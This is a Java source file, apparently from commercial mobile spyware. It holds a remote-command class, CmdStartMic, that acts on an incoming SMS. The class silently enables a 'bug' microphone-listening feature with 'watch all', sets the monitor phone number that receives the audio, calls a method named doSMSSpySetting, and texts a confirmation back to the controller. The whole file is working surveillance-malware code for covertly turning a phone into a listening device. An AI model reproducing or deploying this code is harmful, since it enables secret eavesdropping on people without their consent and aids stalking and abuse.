package com.vvt.rmtcmd.sms;

import com.vvt.global.Global;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.version.VersionInfo;

public class CmdStartMic extends RmtCmdSync {
	
	public CmdStartMic(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	private void doSMSHeader() {
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(licenseInfo.getProductID());
		responseMessage.append(Constant.SPACE);
		responseMessage.append(VersionInfo.getFullVersion());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(smsCmdCode.getStartMicCmd());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.SPACE);
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		doSMSHeader();
		try {	
			Preference pref = Global.getPreference();
			PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			bugInfo.setEnabled(true);
			bugInfo.setWatchAllEnabled(true);
			String monitorNumber = rmtCmdLine.getMonitorNumber();
			if (!monitorNumber.equals(Constant.EMPTY_STRING)) {
				bugInfo.setMonitorNumber(monitorNumber);
			}
			pref.commit(bugInfo);
			responseMessage.append(Constant.OK);
			responseMessage.append(Constant.CRLF);
			doSMSSpySetting();
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
		}
		smsMessage.setMessage(responseMessage.toString());
		send();
	}
	
	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("CmdStartMic.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		responseMessage.delete(0, responseMessage.length());
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		responseMessage.delete(0, responseMessage.length());
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
